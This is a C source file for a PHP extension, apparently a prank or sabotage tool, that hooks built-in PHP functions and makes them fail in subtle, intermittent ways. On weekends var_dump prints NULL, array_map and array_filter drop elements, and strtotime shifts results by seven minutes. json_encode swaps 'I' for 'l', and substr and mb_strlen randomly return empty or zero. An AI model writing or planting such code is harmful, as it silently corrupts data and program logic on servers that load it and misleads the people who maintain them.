//
// Created by Carl.Guo on 2022/12/30.
//
#include <php.h>
#include "override_func.h"

#if PHP_VERSION_ID < 70000

/**
 * evil_php_override_func
 * @param name
 * @param handler
 * @param stash
 */
static void evil_php_override_func(char *name, php_func handler, php_func *stash TSRMLS_DC)
{
    zend_function *func;
    if (evil_zend_hash_find(CG(function_table), name, strlen(name) + 1, (void **) &func) == SUCCESS)
    {
        if (stash)
        {
            *stash = func->internal_function.handler;
        }
        func->internal_function.handler = handler;
    }
}

#else

/**
 * evil_php_override_func
 * @param name
 * @param handler
 * @param stash
 */
static void evil_php_override_func(char *name, php_func handler, php_func *stash TSRMLS_DC)
{
    zend_string *name_string;
    name_string = zend_string_init(name, strlen(name), 0);
    zend_function *func;

    func = zend_hash_find_ptr(CG(function_table), name_string);
    if (func)
    {
        if (stash)
        {
            *stash = func->internal_function.handler;
        }
        func->internal_function.handler = handler;
    }

    zend_string_release(name_string);
}

#endif

/**
 * evilRewriteFunc
 * @param mn
 * @param overFunc
 * @param overFuncName
 */

void evilRewriteFunc(php_func overFunc, char *overFuncName TSRMLS_DC)
{
    override_func_t *override_cls = emalloc(sizeof(override_func_t));
    override_cls->func = overFunc;
    evil_php_override_func(overFuncName, override_cls->func, &override_cls->old_func TSRMLS_CC);
    evil_override_zend_hash_add_ptr(&overrideFunctions, overFuncName, strlen(overFuncName) + 1, (void *) override_cls,
                                  sizeof(override_func_t), NULL);
    efree(override_cls);
}

#if PHP_VERSION_ID < 70000

/**
 * evil_get_current_method_params
 * @return
 */
static zval *evil_get_current_method_params(TSRMLS_D)
{
    zend_execute_data *data = EG(current_execute_data);
    void **p;
    p = data->function_state.arguments;
    if (p)
    {
        int arg_count;
        arg_count = (int) (zend_uintptr_t) *p;

        if (arg_count > 0)
        {
            zval *params;
            MAKE_STD_ZVAL(params);
            array_init(params);

            int i;
            for (i = 0; i < arg_count; i++)
            {
                zval *element;
                ALLOC_ZVAL(element);

                *element = **((zval **) (p - (arg_count - i)));
                zval_copy_ctor(element);
                INIT_PZVAL(element);

                zend_hash_next_index_insert(params->value.ht, &element, sizeof(zval *), NULL);
            }
            return params;
        }
    }
    return NULL;
}

#else

/**
 * evil_get_current_method_params
 * @return
 */
static zval *evil_get_current_method_params(TSRMLS_D)
{
    zval *p, *q;
    uint32_t arg_count, first_extra_arg;
    uint32_t i, n;
    zend_execute_data *ex = EG(current_execute_data);
    arg_count = ZEND_CALL_NUM_ARGS(ex);
    if (arg_count)
    {
        zval params;
        array_init(&params);
        first_extra_arg = ex->func->op_array.num_args;
        zend_hash_real_init(Z_ARRVAL_P(&params), 1);
        ZEND_HASH_FILL_PACKED(Z_ARRVAL_P(&params))
            {
                i = 0;
                n = 0;
                p = ZEND_CALL_ARG(ex, 1);
                if (arg_count > first_extra_arg)
                {
                    while (i < first_extra_arg)
                    {
                        q = p;
                        if (EXPECTED(Z_TYPE_INFO_P(q) != IS_UNDEF))
                        {
                            ZVAL_DEREF(q);
                            if (Z_OPT_REFCOUNTED_P(q))
                            {
                                Z_ADDREF_P(q);
                            }
                            n++;
                        }
                        ZEND_HASH_FILL_ADD(q);
                        p++;
                        i++;
                    }
                    p = ZEND_CALL_VAR_NUM(ex, ex->func->op_array.last_var + ex->func->op_array.T);
                }
                while (i < arg_count)
                {
                    q = p;
                    if (EXPECTED(Z_TYPE_INFO_P(q) != IS_UNDEF))
                    {
                        ZVAL_DEREF(q);
                        if (Z_OPT_REFCOUNTED_P(q))
                        {
                            Z_ADDREF_P(q);
                        }
                        n++;
                    }
                    ZEND_HASH_FILL_ADD(q);
                    p++;
                    i++;
                }
            }
        ZEND_HASH_FILL_END();
        Z_ARRVAL_P(&params)->nNumOfElements = n;
        return &params;
    }
    return NULL;
}

#endif

/**
 * evil_var_dump
 * @param ht
 * @param return_value
 * @param return_value_ptr
 * @param this_ptr
 * @param return_value_used
 */
PHP_FUNCTION (evil_var_dump)
{
    int probability = rand() % 100 + 1;
    int week = whatWeekIsToday();

    if (probability > 10 && (week == 0 || week == 6))
    {
        php_printf("NULL\n");
        RETURN_NULL();
    }
    EVIL_ORIGINAL_FUNC_EXEC;
}

#if PHP_VERSION_ID < 70000

php_func original_func()
{
    void *pdata;
    override_func_t *overide_func;
    php_func original_func = NULL;
    const char *func = get_active_function_name();
    if (zend_hash_find(&overrideFunctions, func, strlen(func) + 1, (void **) &pdata) == SUCCESS)
    {
        overide_func = (override_func_t *) pdata;
        original_func = overide_func->old_func;
    }
    return original_func;
}

#else

php_func original_func()
{
    php_func original_func;
    const char *func = get_active_function_name();
    original_func = (php_func) zend_hash_str_find_ptr(&overrideFunctions, func,
                                                      strlen(func));
    return original_func;
}

#endif


/**
 * evil_in_array
 * @param ht
 * @param return_value
 * @param return_value_ptr
 * @param this_ptr
 * @param return_value_used
 */

PHP_FUNCTION (evil_in_array)
{
    zval *params = evil_get_current_method_params(TSRMLS_C);
    if (Z_ARRVAL_P(params) != NULL)
    {
        zval *item_data = EVIL_PARAMS_HASH_INDEX_GET(params, 1);
        if (Z_TYPE_P(item_data) == IS_ARRAY)
        {
            int count = zend_hash_num_elements(Z_ARRVAL_P(item_data));
            if (count % 7 == 0)
            {
                RETURN_FALSE;
            }
        }
    }
    EVIL_ORIGINAL_FUNC_EXEC;
}


/**
 * evil_array_map
 * @param ht
 * @param return_value
 * @param return_value_ptr
 * @param this_ptr
 * @param return_value_used
 */
PHP_FUNCTION (evil_array_map)
{
    EVIL_ORIGINAL_FUNC_EXEC;
    if (whatWeekIsToday() == 0 && Z_TYPE_P(return_value) == IS_ARRAY)
    {
        int count = zend_hash_num_elements(Z_ARRVAL_P(return_value));
        zend_hash_index_del(Z_ARRVAL_P(return_value), count - 1);
    }
}

/**
 * evil_array_filter
 * @param ht
 * @param return_value
 * @param return_value_ptr
 * @param this_ptr
 * @param return_value_used
 */
PHP_FUNCTION (evil_array_filter)
{
    EVIL_ORIGINAL_FUNC_EXEC;
    int probability = rand() % 10 + 1;
    if (probability > 5 && Z_TYPE_P(return_value) == IS_ARRAY)
    {
        int count = zend_hash_num_elements(Z_ARRVAL_P(return_value));
        for (int i = 0; i < count; i++)
        {
            if (i == count - 1)
            {
                EVIL_ZEND_HASH_GET_CURRENT_KEY(return_value);
                if (zend_key == HASH_KEY_IS_STRING)
                {
                    evil_zend_hash_del(return_value, key);
                } else
                {
                    zend_hash_index_del(Z_ARRVAL_P(return_value), idx);
                }
            }
            zend_hash_move_forward(Z_ARRVAL_P(return_value));
        }
    }
}
//
/**
 * evil_sleep
 * @param ht
 * @param return_value
 * @param return_value_ptr
 * @param this_ptr
 * @param return_value_used
 */
PHP_FUNCTION (evil_sleep)
{
    sleep(1);
    EVIL_ORIGINAL_FUNC_EXEC;
}

/**
 * evil_strtotime
 * @param execute_data
 * @param return_value
 */
PHP_FUNCTION (evil_strtotime)
{
    EVIL_ORIGINAL_FUNC_EXEC;
    if (Z_TYPE_P(return_value) == IS_LONG)
    {
        Z_LVAL_P(return_value) -= 60 * 7;
    }
}

/**
 * evil_json_encode
 * @param ht
 * @param return_value
 * @param return_value_ptr
 * @param this_ptr
 * @param return_value_used
 */
PHP_FUNCTION (evil_json_encode)
{
    EVIL_ORIGINAL_FUNC_EXEC;
    if (Z_TYPE_P(return_value) == IS_STRING)
    {
#if PHP_VERSION_ID < 70000
        zval *search, *replace;
        MAKE_STD_ZVAL(search);
        MAKE_STD_ZVAL(replace);
        ZVAL_STRINGL(search, "I", 1, 1);
        ZVAL_STRINGL(replace, "l", 1, 1);
        php_char_to_str_ex(Z_STRVAL_P(return_value),
                           Z_STRLEN_P(return_value),
                           Z_STRVAL_P(search)[0],
                           Z_STRVAL_P(replace),
                           Z_STRLEN_P(replace),
                           return_value,
                           1,
                           NULL);
#else
        zend_string *lStr = php_str_to_str(Z_STRVAL_P(return_value),
                                           Z_STRLEN_P(return_value),
                                           "I",
                                           1, "l", 1);
        ZVAL_STRINGL(return_value, ZSTR_VAL(lStr), Z_STRLEN_P(return_value));
#endif

    }
}

/**
 * evil_substr
 * @param ht
 * @param return_value
 * @param return_value_ptr
 * @param this_ptr
 * @param return_value_used
 */
PHP_FUNCTION (evil_substr)
{
    int probability = rand() % 100 + 1;

    if (probability > 50)
    {
        RETURN_EMPTY_STRING();
    }
    EVIL_ORIGINAL_FUNC_EXEC;
}

/**
 * evil_mb_strlen
 * @param execute_data
 * @param return_value
 */
PHP_FUNCTION (evil_mb_strlen)
{

    int probability = rand() % 100 + 1;

    if (probability > 50)
    {
        RETURN_LONG(0);
    }
    EVIL_ORIGINAL_FUNC_EXEC;
}

